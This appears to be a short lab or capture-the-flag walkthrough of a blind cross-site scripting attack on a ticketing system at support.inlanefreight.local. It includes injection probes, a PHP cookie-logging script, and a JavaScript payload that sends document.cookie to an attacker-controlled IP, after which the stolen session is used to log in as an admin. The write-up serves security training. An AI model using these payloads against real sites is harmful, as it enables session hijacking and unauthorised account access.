The tester found a ticketing system at http://support.inlanefreight.local.

He then proceeded to start a PHP server:
```shell-session
# sudo php -S 0.0.0.0:80
```

And trying to find a vulnerable field to XSS attack:
```javascript
"><script src="http://10.10.16.19/field_name"></script>
```

He then got a message request, meaning the message field is vulnerable:
```shell-session
# sudo php -S 0.0.0.0:80
[Fri Jul 19 10:48:55 2024] PHP 8.2.12 Development Server (http://0.0.0.0:80) started

[Fri Jul 19 10:49:11 2024] 10.129.176.69:36548 Closing
```

The tester then prepared the following `index.php` file to get the cookies:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

The tester then appended the following payload to a `script.js` file:
```javascript
new Image().src='http://10.10.16.19/index.php?c='+document.cookie
```

He then made a file request to the server:
```javascript
"><script src=http://10.10.16.19/script.js></script>
```

The tester then got the cookie on the server side:
```shell-session
# sudo php -S 0.0.0.0:80

```

The tester then used the [Cookie-Editor](https://cookie-editor.cgagnier.ca/) extension on the login page in order to change the cookie to the one we found, and potentially gain access as another user:

The tester finally refreshed the page and got access to ticketing system as an admin user:
